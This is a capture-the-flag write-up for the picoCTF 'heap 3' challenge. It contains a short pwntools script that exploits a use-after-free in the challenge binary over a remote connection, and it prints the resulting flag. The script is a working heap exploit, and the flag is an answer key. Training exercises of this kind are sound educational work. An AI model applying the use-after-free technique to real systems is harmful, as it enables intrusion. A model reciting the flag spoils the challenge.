# heap 3

Author: Abrxs

This program mishandles memory. Can you exploit it to get the flag? Download the binary [here](chall). Download the source [here](chall.c). Connect with the challenge instance here: `nc tethys.picoctf.net 50345`

## Solution

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
#io = elf.process()
io = remote("tethys.picoctf.net", 50049)
#context.log_level = "debug"

io.sendlineafter(b": ", b"5")
io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", b"32")
io.sendlineafter(b": ", b"A" * 30 + b'pico')
io.sendlineafter(b": ", b"4")

io.recvuntil(b"YOU WIN!!11!!\n")
flag = io.recvline().strip()
log.success(flag.decode())

io.close()
```

**Flag:** `picoCTF{now_thats_free_real_estate_e8938a97}`
